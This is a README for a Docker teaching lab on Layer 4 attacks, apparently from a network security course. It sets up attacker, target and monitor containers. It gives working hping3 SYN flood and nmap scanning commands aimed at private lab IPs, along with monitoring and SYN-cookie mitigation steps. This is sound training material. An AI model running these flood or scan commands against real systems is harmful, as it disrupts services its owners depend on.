# 🔄 Pertemuan 6: L4 Security Lab (TCP/UDP Attacks)

Lab environment untuk praktik SYN flood, TCP session hijacking, dan UDP amplification attacks di Layer 4.

---

## 🚀 Quick Start

### Prerequisites
- Docker dan Docker Compose terinstall
- Repository di-clone dari GitHub
- 4GB RAM available
- ~2GB disk space

### Clone Repository
```bash
git clone https://github.com/Muhammad-Ikhwan-Fathulloh/Network-Security-Course-Bank.git
cd Network-Security-Course-Bank
```

### Jalankan Lab
```bash
# Go to Labs folder
cd Labs

# Start Pertemuan 6 lab
docker-compose -f docker-compose-p6.yml up -d

# Verifikasi (should show 4 containers)
docker-compose -f docker-compose-p6.yml ps

# Access attacker container
docker-compose -f docker-compose-p6.yml exec attacker-l4 bash
```

### Cleanup
```bash
docker-compose -f docker-compose-p6.yml down
```

---

## 📋 Lab Structure

```
Labs/
├── docker-compose-p6.yml
├── README.md
└── QUICK_REFERENCE.md

Pertemuan6/
├── README.md (this file)
├── INDEX.md
├── captures/
├── scripts/
└── configs/
```

---

## 🐳 Container Services

| Container | IP | Role |
|-----------|----|----|
| attacker-l4 | 192.168.60.2 | Kali attacker |
| target-webserver-l4 | 192.168.60.3:8080 | Nginx web server |
| target-udp-service | 192.168.60.4:5354/UDP | DNS service |
| monitor-l4 | 192.168.60.5 | Monitoring |

---

## 📖 SYN Flood Attack Workflow

**Terminal 1: Monitor Packets**
```bash
docker-compose -f docker-compose-p6.yml exec monitor-l4 bash
tcpdump -i eth0 'tcp[tcpflags] & tcp-syn != 0' -c 100
```

**Terminal 2: Monitor Server State**
```bash
docker-compose -f docker-compose-p6.yml exec target-webserver-l4 bash
watch -n 1 "netstat -atn | grep SYN_RECV | wc -l"
```

**Terminal 3: Launch Attack**
```bash
docker-compose -f docker-compose-p6.yml exec attacker-l4 bash

# Install hping3 if needed
apt-get update && apt-get install -y hping3

# SYN Flood attack
hping3 -S --flood --rand-source -p 80 192.168.60.3

# Stop with Ctrl+C after 10-15 seconds
```

---

## 🔧 Common Attacks

### TCP SYN Flood
```bash
hping3 -S --flood --rand-source -p 80 192.168.60.3
```

### UDP Amplification
```bash
nslookup @192.168.60.4 -port=5354 google.com
```

### Port Scanning
```bash
nmap -sS 192.168.60.3
nmap -sU 192.168.60.4
```

---

## 🔧 Mitigation Testing

### Enable SYN Cookies
```bash
docker-compose -f docker-compose-p6.yml exec target-webserver-l4 bash

# Enable
sysctl -w net.ipv4.tcp_syncookies=1

# Verify
sysctl net.ipv4.tcp_syncookies
```

---

## 📞 Documentation

- **Theory & Hands-on:** `Pertemuan6.md`
- **Lab Overview:** `Pertemuan6/INDEX.md`
- **Main Guide:** `Labs/README.md`
- **Quick Reference:** `Labs/QUICK_REFERENCE.md`

---

## 🎓 Learning Outcomes

- ✅ TCP three-way handshake
- ✅ SYN flood mechanism and impact
- ✅ Server resource exhaustion
- ✅ TCP state machine
- ✅ UDP amplification attacks
- ✅ Mitigation strategies
- ✅ Real-time monitoring

---

## 📚 Repository
GitHub: https://github.com/Muhammad-Ikhwan-Fathulloh/Network-Security-Course-Bank

---

**Next:** Baca `Pertemuan6.md` untuk teori lengkap dan detailed hands-on guide.
